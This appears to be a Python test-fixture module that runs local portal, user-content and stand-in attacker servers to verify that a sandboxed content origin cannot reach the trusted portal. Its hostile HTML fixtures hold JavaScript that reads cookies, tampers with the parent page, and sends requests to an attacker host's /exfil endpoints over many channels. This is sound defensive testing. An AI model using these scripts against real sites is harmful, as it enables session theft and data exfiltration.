"""Small in-process HTTP fixtures used by the browser security tests.

These servers are deliberately test-only. They do not expose the production content URLconf,
artifact bytes, authorization, or render credentials.
"""

from __future__ import annotations

import json
from base64 import b64decode
from collections.abc import Iterator
from dataclasses import dataclass
from html import escape
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from threading import Lock, Thread
from urllib.parse import urlsplit

from django.http import HttpResponse

from agora.rendering.security import (
    apply_content_response_policy,
    apply_portal_response_policy,
    portal_content_iframe_attributes,
)

PORTAL_HOST = "portal.agora.test"
CONTENT_HOST = "content.agorausercontent.test"
ATTACKER_HOST = "attacker.agora-evil.test"
_ONE_PIXEL_PNG = b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="
)


@dataclass(frozen=True, slots=True)
class RequestRecord:
    """Safe request metadata retained for assertions, without bodies or query strings."""

    method: str
    path: str
    cookie: str | None


class _FixtureHTTPServer(ThreadingHTTPServer):
    daemon_threads = True
    fixture: FixtureServer


class _FixtureRequestHandler(BaseHTTPRequestHandler):
    server: _FixtureHTTPServer

    def do_GET(self) -> None:
        self._dispatch()

    def do_HEAD(self) -> None:
        self._dispatch()

    def do_OPTIONS(self) -> None:
        self._dispatch()

    def do_POST(self) -> None:
        content_length = self.headers.get("Content-Length", "0")
        try:
            body_length = min(int(content_length), 1_048_576)
        except ValueError:
            body_length = 0
        if body_length:
            self.rfile.read(body_length)
        self._dispatch()

    def _dispatch(self) -> None:
        self.server.fixture.handle(self)

    def log_message(self, format: str, *args: object) -> None:
        del format, args


class FixtureServer:
    """Serve one loopback-bound fixture origin with a small, explicit route set."""

    def __init__(
        self,
        host: str,
        *,
        portal_origin: str = "",
        content_origin: str = "",
        attacker_origin: str = "",
    ) -> None:
        self.host = host
        self.portal_origin = portal_origin
        self.content_origin = content_origin
        self.attacker_origin = attacker_origin
        self._requests: list[RequestRecord] = []
        self._request_lock = Lock()
        self._httpd = _FixtureHTTPServer(("127.0.0.1", 0), _FixtureRequestHandler)
        self._httpd.fixture = self
        self._thread: Thread | None = None

    @property
    def origin(self) -> str:
        return f"http://{self.host}:{self._httpd.server_address[1]}"

    def url(self, path: str) -> str:
        if not path.startswith("/"):
            raise ValueError("fixture paths must start with '/'")
        return f"{self.origin}{path}"

    def start(self) -> None:
        if self._thread is not None:
            raise RuntimeError("fixture server already started")
        self._thread = Thread(target=self._httpd.serve_forever, name=f"fixture-{self.host}")
        self._thread.start()

    def close(self) -> None:
        if self._thread is None:
            return
        self._httpd.shutdown()
        self._httpd.server_close()
        self._thread.join(timeout=2)
        self._thread = None

    def requests(self) -> tuple[RequestRecord, ...]:
        with self._request_lock:
            return tuple(self._requests)

    def requests_for(self, path: str) -> tuple[RequestRecord, ...]:
        return tuple(request for request in self.requests() if request.path == path)

    def handle(self, handler: _FixtureRequestHandler) -> None:
        path = urlsplit(handler.path).path
        with self._request_lock:
            self._requests.append(
                RequestRecord(
                    method=handler.command,
                    path=path,
                    cookie=handler.headers.get("Cookie"),
                )
            )

        if self.host == PORTAL_HOST:
            response = self._portal_response(path)
        elif self.host == CONTENT_HOST:
            response = self._content_response(path, origin=handler.headers.get("Origin"))
        else:
            response = self._attacker_response(path)

        handler.send_response(response.status_code)
        for name, value in _response_headers(response):
            handler.send_header(name, value)
        handler.send_header("Content-Length", str(len(response.content)))
        handler.end_headers()
        if handler.command != "HEAD" and response.content:
            handler.wfile.write(response.content)

    def _portal_response(self, path: str) -> HttpResponse:
        if path == "/fixture/storage":
            body = self._portal_page(
                (
                    ("hostile-a", "/fixture/storage-a"),
                    ("hostile-b", "/fixture/storage-b"),
                )
            )
        elif path == "/fixture/storage-a":
            body = self._portal_page((("hostile-a", "/fixture/storage-a"),))
        elif path == "/fixture/storage-b":
            body = self._portal_page((("hostile-b", "/fixture/storage-b"),))
        elif path == "/fixture/csv":
            body = self._portal_page((("csv-content", "/fixture/csv"),))
        elif path == "/fixture/package":
            body = self._portal_page((("package-content", "/fixture/package"),))
        else:
            body = self._portal_page((("hostile-content", "/fixture/hostile"),))
        response = HttpResponse(body, content_type="text/html; charset=utf-8")
        response.set_cookie("portal_probe", "portal-only", httponly=True, samesite="Lax")
        return apply_portal_response_policy(response, content_origin=self.content_origin)

    def _content_response(self, path: str, *, origin: str | None) -> HttpResponse:
        status = 200
        content_type = "text/html; charset=utf-8"
        body: str | bytes
        if path == "/fixture/hostile":
            body = _hostile_fixture(self.attacker_origin)
        elif path == "/fixture/storage-a":
            body = _storage_fixture(self.attacker_origin, role="a")
        elif path == "/fixture/storage-b":
            body = _storage_fixture(self.attacker_origin, role="b")
        elif path == "/fixture/csv":
            body = _csv_fixture()
        elif path == "/fixture/package":
            body = _package_fixture()
        elif path == "/fixture/data.csv":
            body = "name,value\nalpha,1\n"
            content_type = "text/csv; charset=utf-8"
        elif path == "/fixture/package.css":
            body = "body { color: rgb(17, 34, 51); }"
            content_type = "text/css; charset=utf-8"
        elif path == "/fixture/package.png":
            body = _ONE_PIXEL_PNG
            content_type = "image/png"
        else:
            status = 404
            body = "<!doctype html><title>Unknown fixture</title>"

        response = HttpResponse(body, status=status, content_type=content_type)
        if (
            path in {"/fixture/data.csv", "/fixture/package.css", "/fixture/package.png"}
            and origin == "null"
        ):
            response.headers["Access-Control-Allow-Origin"] = "null"
            response.headers["Vary"] = "Origin"
        response.set_cookie("content_probe", "must-be-removed")
        return apply_content_response_policy(response, portal_origin=self.portal_origin)

    def _attacker_response(self, path: str) -> HttpResponse:
        if path == "/frame-portal":
            body = _attacker_page(self.portal_origin, "portal")
        elif path == "/frame-content":
            body = _attacker_page(self.content_origin + "/fixture/hostile", "content")
        else:
            response = HttpResponse(status=204)
            return response
        return HttpResponse(body, content_type="text/html; charset=utf-8")

    def _portal_page(self, frames: tuple[tuple[str, str], ...]) -> str:
        iframe_markup = "\n".join(
            _iframe_markup(
                frame_id=frame_id,
                content_url=self.content_origin + path,
                content_origin=self.content_origin,
            )
            for frame_id, path in frames
        )
        return f"""<!doctype html>
<html lang="en">
  <head><meta charset="utf-8"><title>Trusted portal fixture</title></head>
  <body>
    <main id="portal-shell" data-test="portal-page">
      <h1>Trusted portal fixture</h1>
      <p id="portal-marker">Portal DOM marker must remain unchanged.</p>
      {iframe_markup}
    </main>
  </body>
</html>
"""


class BrowserFixtureStack:
    """Start the three isolated fixture origins used by the browser tests."""

    def __init__(self) -> None:
        self.attacker = FixtureServer(ATTACKER_HOST)
        self.attacker.start()
        self.content = FixtureServer(
            CONTENT_HOST,
            attacker_origin=self.attacker.origin,
        )
        self.content.start()
        self.portal = FixtureServer(
            PORTAL_HOST,
            content_origin=self.content.origin,
        )
        self.portal.start()
        self.attacker.portal_origin = self.portal.origin
        self.attacker.content_origin = self.content.origin
        self.content.portal_origin = self.portal.origin

    @property
    def host_resolver_rules(self) -> str:
        return ", ".join(
            f"MAP {host} 127.0.0.1" for host in (PORTAL_HOST, CONTENT_HOST, ATTACKER_HOST)
        )

    def close(self) -> None:
        self.portal.close()
        self.content.close()
        self.attacker.close()

    def __enter__(self) -> BrowserFixtureStack:
        return self

    def __exit__(self, *args: object) -> None:
        del args
        self.close()


def _response_headers(response: HttpResponse) -> Iterator[tuple[str, str]]:
    yield from response.headers.items()
    for cookie in response.cookies.values():
        yield "Set-Cookie", cookie.OutputString()


def _iframe_markup(*, frame_id: str, content_url: str, content_origin: str) -> str:
    attributes = portal_content_iframe_attributes(content_url, content_origin=content_origin)
    serialized = " ".join(
        f'{escape(name, quote=True)}="{escape(value, quote=True)}"'
        for name, value in attributes.items()
    )
    return (
        f'<iframe id="{escape(frame_id, quote=True)}" title="Hostile dashboard fixture" '
        f"{serialized}></iframe>"
    )


def _attacker_page(target_url: str, target_name: str) -> str:
    return f"""<!doctype html>
<html lang="en">
  <head><meta charset="utf-8"><title>Attacker fixture</title></head>
  <body>
    <p data-test="attacker-page">Untrusted framing page.</p>
    <iframe id="{escape(target_name, quote=True)}" src="{escape(target_url, quote=True)}"></iframe>
  </body>
</html>
"""


def _hostile_fixture(attacker_origin: str) -> str:
    external = attacker_origin + "/exfil"
    websocket = external.replace("http://", "ws://", 1)
    return f"""<!doctype html>
<html lang="en">
  <head><meta charset="utf-8"><title>Hostile fixture</title></head>
  <body data-ready="false">
    <h1 data-test="content-title">Hostile dashboard fixture</h1>
    <pre data-test="results"></pre>
    <form id="blocked-form" action="{escape(external + "/form", quote=True)}" method="post">
      <input name="probe" value="form">
    </form>
    <script>
      const EXTERNAL = {json.dumps(external)};
      const WEBSOCKET = {json.dumps(websocket)};
      const results = {{}};
      const output = document.querySelector('[data-test="results"]');
      const delay = (milliseconds) => new Promise((resolve) => setTimeout(resolve, milliseconds));
      const settle = (promise) => Promise.race([
        promise,
        delay(250).then(() => 'timeout'),
      ]);
      const mark = (name, value) => {{ results[name] = value; }};

      async function fetchAttempt() {{
        try {{
          await settle(fetch(
            EXTERNAL + '/fetch',
            {{ method: 'POST', mode: 'no-cors', body: 'fetch' }},
          ));
          return 'allowed';
        }} catch (error) {{ return 'blocked'; }}
      }}

      function xhrAttempt() {{
        return new Promise((resolve) => {{
          let finished = false;
          const finish = (value) => {{ if (!finished) {{ finished = true; resolve(value); }} }};
          try {{
            const request = new XMLHttpRequest();
            request.open('POST', EXTERNAL + '/xhr');
            request.onload = () => finish('allowed');
            request.onerror = () => finish('blocked');
            request.ontimeout = () => finish('timeout');
            request.timeout = 250;
            request.send('xhr');
          }} catch (error) {{ finish('blocked'); }}
          setTimeout(() => finish('timeout'), 300);
        }});
      }}

      function websocketAttempt() {{
        return new Promise((resolve) => {{
          let finished = false;
          const finish = (value) => {{ if (!finished) {{ finished = true; resolve(value); }} }};
          try {{
            const socket = new WebSocket(WEBSOCKET + '/websocket');
            socket.onopen = () => {{ socket.close(); finish('allowed'); }};
            socket.onerror = () => finish('blocked');
          }} catch (error) {{ finish('blocked'); }}
          setTimeout(() => finish('timeout'), 300);
        }});
      }}

      function eventSourceAttempt() {{
        return new Promise((resolve) => {{
          let finished = false;
          const finish = (value) => {{ if (!finished) {{ finished = true; resolve(value); }} }};
          try {{
            const source = new EventSource(EXTERNAL + '/event-source');
            source.onopen = () => {{ source.close(); finish('allowed'); }};
            source.onerror = () => {{ source.close(); finish('blocked'); }};
          }} catch (error) {{ finish('blocked'); }}
          setTimeout(() => finish('timeout'), 300);
        }});
      }}

      function imageAttempt() {{
        return new Promise((resolve) => {{
          const image = new Image();
          image.onload = () => resolve('allowed');
          image.onerror = () => resolve('blocked');
          image.src = EXTERNAL + '/image';
          document.body.appendChild(image);
          setTimeout(() => resolve('timeout'), 250);
        }});
      }}

      function fontAttempt() {{
        if (!window.FontFace) return Promise.resolve('unsupported');
        const font = new FontFace('external-probe', `url(${{EXTERNAL}}/font)`);
        document.fonts.add(font);
        return settle(font.load()).then((value) => value === 'timeout' ? 'timeout' : 'allowed')
          .catch(() => 'blocked');
      }}

      async function storageAttempt() {{
        const storage = {{}};
        for (const name of ['localStorage', 'sessionStorage']) {{
          try {{
            const target = window[name];
            target.setItem('agora-storage-probe', 'hostile');
            storage[name] = 'writable';
          }} catch (error) {{ storage[name] = 'blocked'; }}
        }}
        try {{
          const cache = await caches.open('agora-storage-probe');
          const key = new Request(new URL('/__agora-cross-frame-cache-probe', location.href).href);
          await cache.put(key, new Response('hostile'));
          storage.cacheStorage = 'writable';
        }} catch (error) {{ storage.cacheStorage = 'blocked'; }}
        try {{
          const request = indexedDB.open('agora-storage-probe');
          await new Promise((resolve, reject) => {{
            request.onsuccess = () => {{ request.result.close(); resolve(null); }};
            request.onerror = () => reject(request.error);
          }});
          storage.indexedDB = 'available';
        }} catch (error) {{ storage.indexedDB = 'blocked'; }}
        return storage;
      }}

      async function run() {{
        mark('origin', location.origin);
        try {{ mark('cookie', document.cookie); }}
        catch (error) {{ mark('cookie', 'blocked'); }}
        try {{
          window.top.document.getElementById('portal-marker').textContent = 'changed';
          mark('parent-dom', 'allowed');
        }} catch (error) {{ mark('parent-dom', 'blocked'); }}
        try {{
          document.domain = document.domain;
          mark('document-domain', 'allowed');
        }} catch (error) {{ mark('document-domain', 'blocked'); }}
        try {{
          window.top.location.href = EXTERNAL + '/top-navigation';
          mark('top-navigation', 'allowed');
        }} catch (error) {{ mark('top-navigation', 'blocked'); }}
        try {{
          const popup = window.open(EXTERNAL + '/popup', '_blank');
          mark('popup', popup ? 'allowed' : 'blocked');
          if (popup) popup.close();
        }} catch (error) {{ mark('popup', 'blocked'); }}
        try {{
          document.getElementById('blocked-form').requestSubmit();
          mark('form', 'attempted');
        }} catch (error) {{ mark('form', 'blocked'); }}
        try {{
          const worker = new Worker(EXTERNAL + '/worker.js');
          worker.terminate();
          mark('worker', 'allowed');
        }} catch (error) {{ mark('worker', 'blocked'); }}
        try {{
          const serviceWorker = navigator.serviceWorker;
          if (!serviceWorker) mark('service-worker', 'unsupported');
          else {{
            await serviceWorker.register(EXTERNAL + '/service-worker.js');
            mark('service-worker', 'allowed');
          }}
        }} catch (error) {{ mark('service-worker', 'blocked'); }}
        const externalScript = document.createElement('script');
        externalScript.src = EXTERNAL + '/script.js';
        document.head.appendChild(externalScript);
        const externalStylesheet = document.createElement('link');
        externalStylesheet.rel = 'stylesheet';
        externalStylesheet.href = EXTERNAL + '/stylesheet.css';
        document.head.appendChild(externalStylesheet);
        const externalFrame = document.createElement('iframe');
        externalFrame.src = EXTERNAL + '/nested-frame';
        document.body.appendChild(externalFrame);
        const externalObject = document.createElement('object');
        externalObject.data = EXTERNAL + '/object';
        document.body.appendChild(externalObject);
        const manifest = document.createElement('link');
        manifest.rel = 'manifest';
        manifest.href = EXTERNAL + '/manifest.json';
        document.head.appendChild(manifest);
        const prefetch = document.createElement('link');
        prefetch.rel = 'prefetch';
        prefetch.href = EXTERNAL + '/prefetch';
        document.head.appendChild(prefetch);
        const dnsPrefetch = document.createElement('link');
        dnsPrefetch.rel = 'dns-prefetch';
        dnsPrefetch.href = EXTERNAL;
        document.head.appendChild(dnsPrefetch);
        try {{
          const beacon = navigator.sendBeacon(EXTERNAL + '/beacon', 'beacon');
          mark('beacon', beacon ? 'queued' : 'blocked');
        }} catch (error) {{ mark('beacon', 'blocked'); }}
        const cssProbe = document.createElement('div');
        cssProbe.style.backgroundImage = `url(${{EXTERNAL}}/css)`;
        document.body.appendChild(cssProbe);
        mark('css-image', 'attempted');
        const mediaProbe = document.createElement('audio');
        mediaProbe.src = EXTERNAL + '/media';
        mediaProbe.load();
        document.body.appendChild(mediaProbe);
        mark('media', 'attempted');
        const [
          fetchResult, xhrResult, websocketResult, eventSourceResult, imageResult, fontResult,
        ] =
          await Promise.all([
            fetchAttempt(), xhrAttempt(), websocketAttempt(), eventSourceAttempt(),
            imageAttempt(), fontAttempt(),
          ]);
        mark('fetch', fetchResult);
        mark('xhr', xhrResult);
        mark('websocket', websocketResult);
        mark('event-source', eventSourceResult);
        mark('image', imageResult);
        mark('font', fontResult);
        mark('storage', await storageAttempt());
        await delay(100);
        output.dataset.results = JSON.stringify(results);
        document.body.dataset.ready = 'true';
      }}

      run().catch((error) => {{
        output.dataset.results = JSON.stringify({{ fatal: String(error) }});
        document.body.dataset.ready = 'true';
      }});
    </script>
  </body>
</html>
"""


def _csv_fixture() -> str:
    return """<!doctype html>
<html lang="en">
  <head><meta charset="utf-8"><title>CSV fixture</title></head>
  <body data-ready="false" data-csv="pending">
    <script>
      fetch('data.csv')
        .then((response) => response.text())
        .then((text) => {
          document.body.dataset.csv = text.includes('alpha,1') ? 'loaded' : 'invalid';
          document.body.dataset.ready = 'true';
        })
        .catch(() => {
          document.body.dataset.csv = 'blocked';
          document.body.dataset.ready = 'true';
        });
    </script>
  </body>
</html>
"""


def _package_fixture() -> str:
    return """<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Package fixture</title>
    <link rel="stylesheet" href="package.css">
  </head>
  <body data-ready="false" data-css="pending" data-image="pending">
    <img id="package-image" src="package.png" alt="">
    <script>
      window.addEventListener('load', () => {
        const image = document.querySelector('#package-image');
        document.body.dataset.css = getComputedStyle(document.body).color === 'rgb(17, 34, 51)'
          ? 'loaded'
          : 'blocked';
        document.body.dataset.image = image.complete && image.naturalWidth === 1
          ? 'loaded'
          : 'blocked';
        document.body.dataset.ready = 'true';
      });
    </script>
  </body>
</html>
"""


def _storage_fixture(attacker_origin: str, *, role: str) -> str:
    external = attacker_origin + "/storage-exfil"
    return f"""<!doctype html>
<html lang="en">
  <head><meta charset="utf-8"><title>Storage fixture {escape(role)}</title></head>
  <body data-ready="false">
    <h1 data-test="storage-title">Storage fixture {escape(role)}</h1>
    <pre data-test="results"></pre>
    <script>
      const ROLE = {json.dumps(role)};
      const EXTERNAL = {json.dumps(external)};
      const output = document.querySelector('[data-test="results"]');
      const delay = (milliseconds) => new Promise((resolve) => setTimeout(resolve, milliseconds));
      const results = {{ origin: location.origin }};
      try {{ results.cookie = document.cookie; }}
      catch (error) {{ results.cookie = 'blocked'; }}
      try {{
        document.domain = document.domain;
        results.documentDomain = 'allowed';
      }} catch (error) {{ results.documentDomain = 'blocked'; }}

      function indexedDbProbe() {{
        return new Promise((resolve) => {{
          let finished = false;
          const finish = (value) => {{ if (!finished) {{ finished = true; resolve(value); }} }};
          let request;
          try {{ request = indexedDB.open('agora-cross-frame'); }}
          catch (error) {{ finish('blocked'); return; }}
          request.onupgradeneeded = () => {{
            if (ROLE === 'a') {{
              try {{ request.result.createObjectStore('probes'); }}
              catch (error) {{ finish('blocked'); }}
            }}
          }};
          request.onerror = () => finish('blocked');
          request.onsuccess = () => {{
            const database = request.result;
            if (!database.objectStoreNames.contains('probes')) {{
              database.close();
              finish(ROLE === 'b' ? 'isolated' : 'blocked');
              return;
            }}
            try {{
              const transaction = database.transaction(
                'probes', ROLE === 'a' ? 'readwrite' : 'readonly'
              );
              const store = transaction.objectStore('probes');
              if (ROLE === 'a') {{
                store.put('a', 'marker');
                transaction.oncomplete = () => {{ database.close(); finish('writable'); }};
                transaction.onerror = () => {{ database.close(); finish('blocked'); }};
              }} else {{
                const read = store.get('marker');
                read.onsuccess = () => {{
                  database.close();
                  finish(read.result === undefined ? 'isolated' : 'shared');
                }};
                read.onerror = () => {{ database.close(); finish('blocked'); }};
              }}
            }} catch (error) {{ database.close(); finish('blocked'); }}
          }};
          setTimeout(() => finish('timeout'), 500);
        }});
      }}

      async function probe() {{
        const storage = {{}};
        if (ROLE === 'b') await delay(100);
        for (const name of ['localStorage', 'sessionStorage']) {{
          try {{
            const target = window[name];
            if (ROLE === 'a') {{
              target.setItem('agora-cross-frame', 'a');
              storage[name] = 'writable';
            }} else {{
              storage[name] = target.getItem('agora-cross-frame') === null ? 'isolated' : 'shared';
            }}
          }} catch (error) {{ storage[name] = 'blocked'; }}
        }}
        try {{
          const cache = await caches.open('agora-cross-frame');
          const key = new Request(new URL('/__agora-cross-frame-cache-probe', location.href).href);
          if (ROLE === 'a') {{
            await cache.put(key, new Response('a'));
            storage.cacheStorage = 'writable';
          }}
          else {{ storage.cacheStorage = await cache.match(key) ? 'shared' : 'isolated'; }}
        }} catch (error) {{ storage.cacheStorage = 'blocked'; }}
        try {{
          storage.indexedDB = await indexedDbProbe();
        }} catch (error) {{ storage.indexedDB = 'blocked'; }}
        try {{
          const worker = new Worker(EXTERNAL + '/storage-worker.js');
          worker.terminate();
          storage.worker = 'allowed';
        }} catch (error) {{ storage.worker = 'blocked'; }}
        results.storage = storage;
        output.dataset.results = JSON.stringify(results);
        document.body.dataset.ready = 'true';
      }}
      probe().catch((error) => {{
        output.dataset.results = JSON.stringify({{ fatal: String(error) }});
        document.body.dataset.ready = 'true';
      }});
    </script>
  </body>
</html>
"""
